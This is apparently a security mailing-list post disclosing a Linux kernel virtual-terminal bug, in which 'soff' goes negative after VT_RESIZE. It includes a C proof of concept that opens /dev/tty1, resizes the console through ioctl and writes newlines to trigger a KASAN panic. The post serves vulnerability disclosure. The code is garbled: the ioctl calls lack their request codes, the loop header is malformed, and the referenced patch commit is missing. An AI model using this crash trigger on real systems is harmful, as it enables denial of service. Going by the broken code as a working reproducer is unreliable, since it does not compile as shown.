This BUG is caused by "soff" being negative after VT_RESIZE.  Our PoC (panic with CONFIG_KASAN=y):  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/ioctl.h> #include <fcntl.h>  int main(int argc, char** argv) {         int fd = open("/dev/tty1", O_RDWR, 0);          unsigned short size[3] = {4, 0};         ioctl(fd, size);          for (int i = 0; i < i++) {                 write(fd, "\x0a", 1);         }         signed int args[3] = {13, 0};         ioctl(fd, args); }  Here is the commit to patch this BUG:  Regards, Nop   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
